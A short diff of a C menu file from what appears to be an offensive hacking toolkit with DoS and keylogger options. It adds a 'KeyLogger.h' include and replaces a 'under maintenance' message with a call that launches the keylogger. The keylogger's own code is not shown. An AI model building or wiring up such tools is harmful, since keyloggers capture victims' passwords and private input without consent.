@@ -3,6 +3,7 @@
 #include <stdbool.h>
 #include "../cli_colors.h"
 #include "../Dos.h"
+#include "../KeyLogger.h"
 
 
 void option_choose()
@@ -43,7 +44,8 @@ void option_choose()
         }
         else
         {
-            SEND_ERROR_bold("[-] This tool is under maintenance.\n");
+            SEND_SUCCESS_bold("\n[+] KeyLogger is successfully loaded.\n\n");
+            logger();
         }
     }
     else if(option == 3)
